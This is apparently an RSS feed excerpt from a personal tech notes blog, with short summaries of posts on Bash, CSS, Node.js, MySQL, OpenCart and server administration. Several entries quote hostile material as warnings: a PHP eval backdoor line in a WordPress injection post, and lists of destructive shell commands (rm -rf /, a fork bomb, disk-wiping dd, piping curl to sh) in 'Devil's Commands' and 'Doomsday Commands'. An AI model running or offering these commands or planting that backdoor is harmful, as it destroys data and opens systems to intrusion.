      <title>Bash script to create OCMOD and vQmod templates with a single command</title>
      <link>/post/bash-scripting/2015-02-16-create-ocmod-vqmod-template-opencart-bash-script/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/2015-02-16-create-ocmod-vqmod-template-opencart-bash-script/</guid>
      <description>OCMOD and vQmod are both modification systems for Opencart which allow you to change things without overwriting any core files. For Opencart version older than 2.x, vQmod was the king. With version 2.x Opencart launched it&amp;rsquo;s own modification system to replace the need for installing a separate extension.
The state Opencart is in right now, you&amp;rsquo;ll find yourself dealing with both vqmod and ocmod scripts. I know i do. So i have written this neat bash script which allows me to type ocmod foo to create a file called foo.</description>
    </item>
    
    <item>
      <title>Bash script to create a new Jekyll post</title>
      <link>/post/bash-scripting/bash_script_to_create_new_jekyll_posts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/bash_script_to_create_new_jekyll_posts/</guid>
      <description>Getting Date # Date DATE=`date +%Y-%m-%d`  This will get today&amp;rsquo;s date in YYYY-MM-DD format.
Stripping spaces and replacing with underscores $ str=&amp;quot;This is just a test&amp;quot; $ echo ${str// /_} This_is_just_a_test  Taking it Further Make it a function What&amp;rsquo;s cooler than a bash script? A bash function! With a function, we don&amp;rsquo;t have to specify script name/location every time. A bash function added to your .bash_profile will work globally anywhere in the Terminal.</description>
    </item>
    
    <item>
      <title>Batch renaming files in Bash</title>
      <link>/post/bash-scripting/batch_renaming_files_in_bash/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/batch_renaming_files_in_bash/</guid>
      <description>Use rename, which is a Perl script and maybe on your system already. You can use the rename command to quickly rename files using a regular expression pattern. For instance, if you wanted to rename all files containing foo to contain bar instead, you could use a command like this one:
rename –v &#39;s/foo/bar/g&#39; *  How to rename multiple files based on a pattern 
for f in * ; do cp &amp;quot;$f&amp;quot; 2014-08-26-&amp;quot;$f&amp;quot; ; done  mv $f ${f#[0-9]*-}  Test</description>
    </item>
    
    <item>
      <title>Book - Hardened Linux From Scratch (HLFS)</title>
      <link>/post/_rsc/2014-06-20-rsc-book-hardened-linux-from-scratch/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_rsc/2014-06-20-rsc-book-hardened-linux-from-scratch/</guid>
      <description>Hardened Linux From Scratch (HLFS) is a project that provides you with step-by-step instructions for building your own customized and hardened Linux system entirely from source. Based on LFS, this project will incorporate parts of BLFS as well. The main differences from these other projects will be the amount of text dealing with security configuration issues as well as patching or substituting many of the packages used for improved security.</description>
    </item>
    
    <item>
      <title>Book - Python for You and Me</title>
      <link>/post/_rsc/2014-06-24-rsc-book-python-for-you-and-me/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_rsc/2014-06-24-rsc-book-python-for-you-and-me/</guid>
      <description>pym is a book to learn Python. It targets people who are completely new to the language. Want to switch from Bash? Want to learn serious scripting language? Try a simple &amp;amp; free book to learn Python programming language for new.</description>
    </item>
    
    <item>
      <title>Book - The Linux Command Line</title>
      <link>/post/_rsc/2014-08-27-rsc-book-the-linux-command-line/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_rsc/2014-08-27-rsc-book-the-linux-command-line/</guid>
      <description>Fantastic book for new users/devops/sysadmins</description>
    </item>
    
    <item>
      <title>CASE Statement</title>
      <link>/post/bash-scripting/case-statements/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/case-statements/</guid>
      <description>CASE statements are similir to ELIF statements, use case if elif statements are more than 3.
case expression in pattern1 ) statements ;; pattern2 ) statements ;; esac  Exactly how you use fi to end if statements, you close a case statement with esac (which is the alphabetic opposite of case, case spelled backwards).
;; marks the end of a statement.
Example:
echo -n &amp;quot;give me a domain: &amp;quot; read domain case $domain in &amp;quot;google.</description>
    </item>
    
    <item>
      <title>CSS Blend Modes</title>
      <link>/post/_css-sass/css_blend_modes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/css_blend_modes/</guid>
      <description>CSS Blend Modes let you blend two or more layers together to create visual effects. You can use blend-modes on pretty much an HTML element including text, svg, images, and videos.
background-blend-mode Default value is normal, meaning no blending. There are 16 values for background-blend-mode including darken, lighten, multiply, overlay, screen,soft-light, color-burn and color-dodge. These blend modes are pretty much the same as what comes with Photoshop and Sketch.</description>
    </item>
    
    <item>
      <title>CSS Positioning</title>
      <link>/post/_css-sass/css_positioning/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/css_positioning/</guid>
      <description>CSS treats each HTML element as it&amp;rsquo;s own box which is usually referred to as the CSS Box Model
 Block-level elements automatically start on a new line (think headings, paragraphs and divs)
 Inline elements sit within surrounding context (think images and spans)
 The default layout of elements in this way is called the normal flow of a document, but CSS offers the position property to override it.</description>
    </item>
    
    <item>
      <title>CSS Style Notes</title>
      <link>/post/_css-sass/css-styling-tips/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/css-styling-tips/</guid>
      <description>Typography Responsive Typography x
Use calc and vw to your advantage. calc let&amp;rsquo;s you easily calculate values based on unknown variables like percentages and ems and vw is the width of the viewport at any given time. One viewport unit is 1% (1/100th) of the viewport size.
body { font-size: calc(14px + .3vw); }  Here 14px is going to be the smallest font size and it&amp;rsquo;s going to increase with the width of the viewport (screen).</description>
    </item>
    
    <item>
      <title>CSS Transitions</title>
      <link>/post/_css-sass/css-transitions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/css-transitions/</guid>
      <description> Links  Codrops: CSS Reference - Transitions  </description>
    </item>
    
    <item>
      <title>CSS Transitions and Transforms</title>
      <link>/post/_css-sass/css-transforms-and-transitions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/css-transforms-and-transitions/</guid>
      <description> Transforms transform lets you modify the visual appearance (coordinate space) of css elements. Elements can be translated, rotated, scaled, and skewed
Examples Scale (resizes elements) Scale the .box by increasing it 20 times it&amp;rsquo;s original size. Value is in percentage
.box { width: 20px; height: 20px; transform: scale(20); }  Translate (moves elements) Skew Rotate center an element
/* center the element */ top: 50%; left: 50%; transform: translate(-50%, -50%);  Links  MDN: transform  </description>
    </item>
    
    <item>
      <title>Change Raspberry Pi&#39;s system startup message (MOTD)</title>
      <link>/post/_raspberrypi/2014-09-04-change-raspberry-pis-system-startup-message-motd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_raspberrypi/2014-09-04-change-raspberry-pis-system-startup-message-motd/</guid>
      <description>MOTD = Message Of The Day
Add the following to ~/.bashrc
################################ # CUSTOM MOTD FOR RASPBERRY PI	################################ let upSeconds=&amp;quot;$(/usr/bin/cut -d. -f1 /proc/uptime)&amp;quot; let secs=$((${upSeconds}%60)) let mins=$((${upSeconds}/60%60)) let hours=$((${upSeconds}/3600%24)) let days=$((${upSeconds}/86400)) UPTIME=`printf &amp;quot;%d days, %02dh %02dm %02ds&amp;quot; &amp;quot;$days&amp;quot; &amp;quot;$hours&amp;quot; &amp;quot;$mins&amp;quot; &amp;quot;$secs&amp;quot;` # get the load averages read one five fifteen rest &amp;lt; /proc/loadavg echo &amp;quot;$(tput setaf 2) .~~. .~~. `date +&amp;quot;%A, %e %B %Y, %r&amp;quot;` &#39;. \ &#39; &#39; / .</description>
    </item>
    
    <item>
      <title>Check if a program is installed</title>
      <link>/post/bash-scripting/check-if-program-installed/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/check-if-program-installed/</guid>
      <description>They key is in using hash or type to see if a command is available. For example, the output of
hash nano  will change based on whether nano is installed or not. If nano is installed, you&amp;rsquo;ll get nothing. If nano is not installed, you&amp;rsquo;ll get an error.
So, we check for an error to see if something is not installed.
command -v foo &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || { echo &amp;gt;&amp;amp;2 &amp;quot;I require foo but it&#39;s not installed.</description>
    </item>
    
    <item>
      <title>Checking log files</title>
      <link>/post/_sysadmin/check-log-files/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/check-log-files/</guid>
      <description>Logs directory The common directory for logs is /var/log. Programs tend to save their logs in their own subdirectories under /var/log/. For example:
 Apache: /var/log/apache2 MySQL: /var/log/mysql  Monitoring logs Get n number of lines from the end of the file with tail -n To check log files, tail is better than cat. cat will dump the whole log file to the console, good luck scrolling. tail -20 will print only the last 20 lines of the file.</description>
    </item>
    
    <item>
      <title>Code Injection Attacks in WordPress</title>
      <link>/post/_sysadmin/code-injection-attacks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/code-injection-attacks/</guid>
      <description>tl;dr: If you find this line of code in any files of your WordPress install, get worried, get rid of it immediately.
&amp;lt;?php @eval($_POST[&#39;@01&#39;]);?&amp;gt;   With this line of code, the hacker will be able to execute any code he wants. Therefore this code will have the power to read, update or delete any data he wants.
We don&amp;rsquo;t know yet what code he will choose to execute because the code will be passed as a $_POST argument.</description>
    </item>
    
    <item>
      <title>Code comparison</title>
      <link>/post/_webdev/2014-09-21-code-comparison/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/2014-09-21-code-comparison/</guid>
      <description>I&amp;rsquo;m one of those folks who are learning multiple programming languages at the same time. I occassionally wonder how the same program would be written in another language. It so happens that i&amp;rsquo;m also at the same time learning multiple human languages (French and Arabic) and i do the same thing with them. I wonder how the same sentence would be writtten in another language. It&amp;rsquo;s good for my learning and it&amp;rsquo;s fun to look up things i already know and find a new meaning.</description>
    </item>
    
    <item>
      <title>Colored Output</title>
      <link>/post/bash-scripting/coloured-output/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/coloured-output/</guid>
      <description>Start=`\033[` Color=`0;32m` Close=`0m`  \033[0;32 marks the beginning of color and \0333[0m marks the end.
What you do is:
echo -e &amp;quot;\033[0;32m This text is green \033[0m&amp;quot;  echo -e &amp;quot;${StartColor} This text is green ${StartClose}&amp;quot;  NOTE: When referencing variables inside an echo, the -e flag is important. So are the double quotation marks &amp;quot;
In Bash, the &amp;lt;Esc&amp;gt; character can be obtained with the following syntaxes:
 \e \033 \x1B  http://misc.</description>
    </item>
    
    <item>
      <title>Coloring the Mac Terminal</title>
      <link>/post/_linux/2014-08-26-coloring-the-mac-terminal/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2014-08-26-coloring-the-mac-terminal/</guid>
      <description>Adding colors to ls and tree Enabling Colors Edit ~/.bash_profile or ~/.profile and add the following two lines:
export CLICOLOR=1 export LSCOLORS=ExFxCxDxBxegedabagacad  you can use this if you are using a black background:
export LSCOLORS=gxBxhxDxfxhxhxhxhxcxcx  LSCOLORS=&amp;quot;ExGxBxDxCxEgEdxbxgxcxd&amp;quot; will emulate the default colouring on the linux ls command.
Making it permanent You can add
alias ls=&#39;ls -Gp&#39; alias tree=&amp;quot;tree -C&amp;quot;  to your ~/.bash_profile to ALWAYS get colored ls and tree output.</description>
    </item>
    
    <item>
      <title>Command line color settings (GNU)</title>
      <link>/post/_linux/2014-08-26-command-line-color-settings-gnu/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2014-08-26-command-line-color-settings-gnu/</guid>
      <description> Coloring the list and tree command outputs (GNU) Customizing Colors (GNU) The format is as follows: LS_COLORS=&amp;quot;di=01;90:ow=01;90&amp;quot;
The LS_COLORS environment variable is a colon : separated list of key=colour pairs. There are 2 types of key: file types and file extensions.
   key effect color meaning     di 01 90 color all dirs dark grey and make it bold   ow 01 90 color all other_writable (o+w) dirs dark grey and make it bold    Links:  Configuring LS_COLORS (GNU) Howto: Add custom color to directory listings COLORS-Dircolors dircolors: modify color settings globaly  </description>
    </item>
    
    <item>
      <title>Common Git/Github Errors</title>
      <link>/post/_git-github/common-git-github-issues/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_git-github/common-git-github-issues/</guid>
      <description>fatal: refusing to merge unrelated histories $ git pull origin master From github.com:aamnah/myproject.com * branch master -&amp;gt; FETCH_HEAD fatal: refusing to merge unrelated histories  Newly created Guthub repo, has only a .gitignore file that the local repo doesn&amp;rsquo;t. can&amp;rsquo;t push without pulling first.
Solution: You can use --allow-unrelated-histories to force the merge to happen.
source</description>
    </item>
    
    <item>
      <title>Common MySQL Errors</title>
      <link>/post/_databases/resolving-mysql-errors/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/resolving-mysql-errors/</guid>
      <description>Error: Can&amp;rsquo;t connect to local MySQL server through socket &amp;lsquo;/var/run/mysqld/mysqld.sock&amp;rsquo; (2) tl;dr
mkdir -p /var/run/mysqld touch /var/run/mysqld/mysqld.sock chmod 777 /var/run/mysqld/mysqld.sock chown mysql:mysql /var/run/mysqld service mysql restart  See if a socket file exists. To find all socket files on your system run:
sudo find / -type s  Mysql server is usually open at /var/lib/mysql/mysql.sock
The MySQl configuration file is usually at /etc/mysql/my.cnf (Ubuntu 17.04)
stop MySQL
sudo service mysqld stop  Look for a .</description>
    </item>
    
    <item>
      <title>Composer</title>
      <link>/post/_php/composer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_php/composer/</guid>
      <description>Install Linux / Unix / Mac
curl -sS https://getcomposer.org/installer | sudo php -- --install-dir=/usr/local/bin --filename=composer  Confirm install with: composer -V
Composer is a dependency manager, like npm.
   npm composer     npm init composer init   package.json composer.json   npm install &amp;ndash;save-dev composer require   node_module vendors    What is the name of the folder that composer puts all of the packages in?</description>
    </item>
    
    <item>
      <title>Conditional Statements IF/ELIF/ELSE</title>
      <link>/post/bash-scripting/if_elif_else_statements/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/if_elif_else_statements/</guid>
      <description>IF / ELSE if [ condition ] then # do something else # do something else fi  Be very particular of the whitespace around [ and ]. It is [ condition ] and not [condition]
OR
if [ condition ]; then # do something else # do something else fi  where you can place then at the end of the same line as your if condition, separated by a semi-colon ;.</description>
    </item>
    
    <item>
      <title>Configure SFTP</title>
      <link>/post/_sysadmin/sftp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/sftp/</guid>
      <description>The ChrootDirectory must be owned by root. You can enable access to dirs inside the ChrootDirectory owned by differet users The ChrootDirectory needs 755 permissions Add everything to the END OF THE FILE. Or else it won&amp;rsquo;t work Web directories /var/www need to be owned by www-data  Setup link Step 1 : Install OpenSSH package if not installed
sudo apt-get install openssh-server  Step 2 : Create separate group for SFTP users.</description>
    </item>
    
    <item>
      <title>Core Modules</title>
      <link>/post/_nodejs/core-modules/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_nodejs/core-modules/</guid>
      <description>core modules are the ones that are there, you don&amp;rsquo;t have to install them, but you do need to specifically include them. For example, load the file system module:
var fs = require(&amp;quot;fs&amp;quot;)  OR import the ES6 way
import fs from &#39;fs&#39;  </description>
    </item>
    
    <item>
      <title>Create Grunt Snippets in Sublime Text</title>
      <link>/post/_workflow/2015-02-15-create-grunt-snippet-sublime-text/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_workflow/2015-02-15-create-grunt-snippet-sublime-text/</guid>
      <description>First things first, read How to create a Snippet in Sublime Text for some basics.
To create a snippet in Sublime Text you save it with a file extension of .sublime-snippet in the Packages folder (/Users/yourname/Library/Application Support/Sublime Text 3/Packages/User on a Mac).
Quick Tip: You can use the shortcut Cmd+Shift+G and paste ~/Library/Application Support/Sublime Text 3/Packages/User to open the folder.
For every snippet that you want to add, you create a new file.</description>
    </item>
    
    <item>
      <title>Creating and Viewing HTML Files with Python</title>
      <link>/post/_python/2014-08-26-creating-and-viewing-html-files-with-python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-26-creating-and-viewing-html-files-with-python/</guid>
      <description> Resources  Creating and Viewing HTML Files with Python - Part 1 Output Data as an HTML File - Part 2  </description>
    </item>
    
    <item>
      <title>Creating our own Modules</title>
      <link>/post/_nodejs/create-modules/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_nodejs/create-modules/</guid>
      <description>tl;dr  Create a module file using module.exports Include that module file using require(). Provide full file path. var fs = require(&amp;quot;fs&amp;quot;) OR import the ES6 way import fs from &#39;fs&#39; You can further organize the modules by giving them their own folder. For example, people use lib to keep their modules in.  Any code that is well designed, reusable, it is a function that can process independantly, you should give it it&amp;rsquo;s own file and include that as a module.</description>
    </item>
    
    <item>
      <title>Database Foundations</title>
      <link>/post/_databases/2015-02-20-database-foundations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-02-20-database-foundations/</guid>
      <description>Creating Database {% highlight mysql %} CREATE DATABASE `shop` DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci; {% endhighlight %}  You can also use the keyword SCHEMA to create a database.
{% highlight mysql %} CREATE SCHEMA `shop`; {% endhighlight %}  Once a database is cerated you can start using it with the following command
{% highlight mysql %} USE `shop`; {% endhighlight %}  Get info about the database {% highlight mysql %} SHOW ENGINES {% endhighlight %}  The default engine is InnoDB.</description>
    </item>
    
    <item>
      <title>Define a clickable interactive map over an image with &amp;lt;map&amp;gt;</title>
      <link>/post/_webdev/html-map-img/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/html-map-img/</guid>
      <description>tl;dr &amp;lt;map name=&amp;quot;primary&amp;quot;&amp;gt; &amp;lt;area shape=&amp;quot;circle&amp;quot; coords=&amp;quot;75,75,75&amp;quot; href=&amp;quot;left.html&amp;quot;&amp;gt; &amp;lt;area shape=&amp;quot;circle&amp;quot; coords=&amp;quot;275,75,75&amp;quot; href=&amp;quot;right.html&amp;quot;&amp;gt; &amp;lt;/map&amp;gt; &amp;lt;img usemap=&amp;quot;#primary&amp;quot; src=&amp;quot;http://placehold.it/350x150&amp;quot; alt=&amp;quot;350 x 150 pic&amp;quot;&amp;gt;   in an &amp;lt;img&amp;gt; tag, specify the usemap attribute and provide the name of whatever map you want to use, for example #world-continents define a map with the &amp;lt;map&amp;gt; tag. Each map takes an &amp;lt;area&amp;gt; tag with shape, coords and href attributes shape could be a rect, circle or poly.</description>
    </item>
    
    <item>
      <title>Delete ALL Unapproved comments in WordPress</title>
      <link>/post/_databases/2015-02-04-delete-unapproved-comments-wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-02-04-delete-unapproved-comments-wordpress/</guid>
      <description>Make a backup first before changing anything.
Go to PhpMyAdmin and select the comments table (usually wp_comments). Go to the SQL tab and run the following command.
DELETE FROM wp_comments WHERE comment_approved = 0  That&amp;rsquo;s all.</description>
    </item>
    
    <item>
      <title>Devil&#39;s Commands</title>
      <link>/post/_commands/devils-commands/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/devils-commands/</guid>
      <description>List of dangerous shell commands It is not uncommon to see trolls tricking new Linux/Unix users run commands as a joke. These commands can destroy users data. Here are a few:
 rm -rf / :(){ :|: &amp;amp; };: mkfs /dev/sda1 cat /dev/zero &amp;gt; /dev/sda1 wget url -O - | sh &amp;ndash; curl url | sh dd if=/dev/zero of=/dev/sda2 echo 726d202d7266202a | xxd -r -p dd if=/dev/random of=/dev/port echo 1 &amp;gt; /proc/sys/kernel/panic cat /dev/port or cat /dev/mem cat /dev/zero &amp;gt; /dev/mem sudo chmod -r 444 / or sudo chown -r nobody:nobody / last | reboot  Explanations  rm -rf / Doesn&amp;rsquo;t work anymore.</description>
    </item>
    
    <item>
      <title>Directly run bash scripts in Github Gists locally in Terminal.</title>
      <link>/post/bash-scripting/directly-run-bash-scripts-from-github-gist/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/directly-run-bash-scripts-from-github-gist/</guid>
      <description>This post is about running install scripts saved in Gists on Github locally from a Mac Terminal using curl. However, this should work for just about any script saved online and is not in any way limited to gists.
You need to have Command Line Tools for Xocde installed.
Run a script off a Github Gist First things first, find a script that you want to install. Here is a bash script that i wrote for installing WordPress.</description>
    </item>
    
    <item>
      <title>Doomsday Commands</title>
      <link>/post/_commands/doomsday-commands/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/doomsday-commands/</guid>
      <description>Delete everything Use these to annihilate your computer.
sudo rm -rf / --no-preserve-root sudo rm -rf /*  Deletes everything, rm rf&amp;rsquo;s the root directory.
sudo shred dev/sda # fill disk with zeroes dd if=/dev/zero of=/dev/sda  completely wipes all data on a drive by overwriting the whole thing, i.e. write zeros (or pseudorandom numbers) over the entire drive
dd has a nickname as Disk Destroyer as it&amp;rsquo;s very easy to blank the wrong device :)</description>
    </item>
    
    <item>
      <title>ES6 (ES2015) and Beyond with Node.js</title>
      <link>/post/_javascript/2017-03-07-es2015-es6-babel-node-js/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/2017-03-07-es2015-es6-babel-node-js/</guid>
      <description>tl;dr # initialize npm init -y # install dependencies npm i -D babel-cli babel-preset-es2015 babel-preset-stage-0 nodemon # Babel config touch .babelrc echo &#39;{ presets: [ &amp;quot;es2015&amp;quot;, &amp;quot;stage-0&amp;quot; ] }&#39; &amp;gt;&amp;gt; .babelrc # directory structure # mkdir src &amp;amp;&amp;amp; touch src/index.js # add some es6 code to index.js for testing # run Babel babel-node src/index.js # add npm run scripts  Note: For the sake of simplicity, i use ES6 and ES2015 interchangeably.</description>
    </item>
    
    <item>
      <title>ES6 Classes vs. Constructor Functions</title>
      <link>/post/_javascript/es2015-classes-vs-constructor-functions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015-classes-vs-constructor-functions/</guid>
      <description>tl;dr  A constructor function is just a normal function that creates (constructs) an object JavaScript does not has classes and hence it does not has methods. What you have are properties in an object, some of which may be functions Javascript is not your classic class-based language but rather a prototype-based language. Classes in JavasScript are syntactic sugar, meaning they&amp;rsquo;re a feature that only changes how you type something, but nothing changes under the hood.</description>
    </item>
    
    <item>
      <title>Editing Apache Configuration on a cPanel/CentOS Server</title>
      <link>/post/_linux/2015-01-19-edit-apache-config-centos-cpanel-command-line/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2015-01-19-edit-apache-config-centos-cpanel-command-line/</guid>
      <description>According to cPanel docs, it&amp;rsquo;s easier to use EasyApache for configuring and regenerating Apache. If you want the recommended way, skip this article. I&amp;rsquo;m more of a command line gal, so i&amp;rsquo;ll go ahead and detail the process of editing httpd.conf from the command line, enabling some modules, adding configurations, retaining the configuration and checking if your configuration has been preserved.
On Debian/Ubuntu it&amp;rsquo;s easier to enable a module. You run the command a2enmod followed by the name of the module and it gets enabled.</description>
    </item>
    
    <item>
      <title>Enable SSL in OpenCart</title>
      <link>/post/_opencart/enable-ssl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_opencart/enable-ssl/</guid>
      <description>Install SSL Enable SSL in Admin Edit config.php files  Install SSL On an Apache (Ubuntu) system where you have SSH access, you can run the following commands to install an SSL (Let&amp;rsquo;s Encrypt)
sudo apt-get update sudo apt-get install software-properties-common sudo add-apt-repository ppa:certbot/certbot # add certbot repo sudo apt-get update sudo apt-get install python-certbot-apache # install certbot sudo certbot --apache # run certbot  Don&amp;rsquo;t forget to add certbot renew to cron</description>
    </item>
    
    <item>
      <title>Error Reporting and Troubleshooting</title>
      <link>/post/_php/error-reporting-troubleshooting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_php/error-reporting-troubleshooting/</guid>
      <description>Enable error reporting System level Display errors could be turned off in the php.ini or your Apache config file.
User level In your index.php (or whatever script you&amp;rsquo;re running) file, add this:
ini_set(&#39;display_startup_errors&#39;,1); ini_set(&#39;display_errors&#39;,1); error_reporting(-1); // error_reporting(E_ALL);  OR add the following to your php.ini file
display_errors = 1; error_reporting = E_ALL; log_errors = 1;  Check error logs Errors and warnings usually appear in ....\logs\php_error.log or ....\logs\apache_error.log depending on your php.</description>
    </item>
    
    <item>
      <title>FHS, File System Architecture and Directory Structure</title>
      <link>/post/_linux/fhs-file-system-architecture-and-directory-structure/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/fhs-file-system-architecture-and-directory-structure/</guid>
      <description>Filesystem Hierarchy Standard  FHS is the standard method of laying out the directory structure in Linux distributions, so that the contents follow a standard layout. That you can always depend upon certain types of files being in certain types of directories, and that they are generally consistent accross distributions.
 Some systems may deviate from FHS in some areas. The current FHS is v2.3, was actually announced Jan 29th, 2004.</description>
    </item>
    
    <item>
      <title>Feature Detection in Browsers, Shims and Polyfills</title>
      <link>/post/_webdev/feature-detection-in-browsers/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/feature-detection-in-browsers/</guid>
      <description>Shims vs. Polyfills
Call it shims if you want to keep the directory generic. A polyfill is a type of shim that retrofits legacy browsers with modern HTML5/CSS3 features usually using Javascript or Flash. A shim, on the other hand, refers to any piece of code that performs interception of an API call and provides a layer of abstraction. It isn&amp;rsquo;t necessarily restricted to a web application or HTML5/CSS3.</description>
    </item>
    
    <item>
      <title>File Test Operators</title>
      <link>/post/bash-scripting/file-test-operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/file-test-operators/</guid>
      <description>File Test Operators Returns true if
 -e and -a file exists -s file is not zero size i.e. not empty -f file is a regular file i.e. not a directory -d file is a directory -h and -L file is a sympbolic link  Check if a file exists if (-e foo.txt ); then echo &amp;quot;foo.txt already exists!&amp;quot; else // Do something fi  Links  Advanced Bash-Scripting Guide: 7.</description>
    </item>
    
    <item>
      <title>Find, install and upgrade Linux software</title>
      <link>/post/_linux/2017-03-05-install-upgrade-search-find-software-packages-linux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2017-03-05-install-upgrade-search-find-software-packages-linux/</guid>
      <description>Update packages list: sudo apt update See packages that can be upgraded: apt list --upgradable See all packages that can be upgraded: apt list --upgradable -a Upgrade packages: apt upgrade Upgrade packages without asking me yes/no: apt upgrade -y Search for packages: apt-cache search foo OR apt search foo Get details about a specific package: apt-cache show foo OR apt show foo  apt-cache The apt-cache command can display much of the information stored in APT&amp;rsquo;s internal database.</description>
    </item>
    
    <item>
      <title>Finding a system breach</title>
      <link>/post/_sysadmin/find-system-breach/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/find-system-breach/</guid>
      <description> Check the logs  /home/user/logs/ /var/log/apache2/access.log /var/log/apache2/error.log  Check .bash_history for any recently run commands  </description>
    </item>
    
    <item>
      <title>Finding infected files in WordPress</title>
      <link>/post/_sysadmin/finding-infected-files-wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/finding-infected-files-wordpress/</guid>
      <description>The best thing to do is to clean your database, delete your site and re-install it.
 Keep things updated Don&amp;rsquo;t install themes from warez sites, duh. If you don&amp;rsquo;t pay for it, you&amp;rsquo;ll end up paying for it, only worse.. Disable any files that you find suspicious. This can be done simply by add a .OFF at the end of the file name, after the extension. For example favicon_de19d8.</description>
    </item>
    
    <item>
      <title>Fixing OpenCart Internal Server Error</title>
      <link>/post/_opencart/fix-opencart-500-internal-server-error/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_opencart/fix-opencart-500-internal-server-error/</guid>
      <description>Error 500 Internal Server Error after transferring web host  Check Apache error logs (usually $HOME/logs/error_log)  1. Option FollowSymlinks not allowed here Option FollowSymlinks not allowed here  Chances are you&amp;rsquo;re on Virtualmin.
 Any Virtualmin site that uses FollowSymLinks can be exploited to allow that user to read all files in /home. That was creating a nightmare
 Virtualmin adds some Options as part of a security fix that could otherwise cause all your websites to be compromised if one of them gets hacked.</description>
    </item>
    
    <item>
      <title>Flask</title>
      <link>/post/_python/2014-08-29-flask/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-29-flask/</guid>
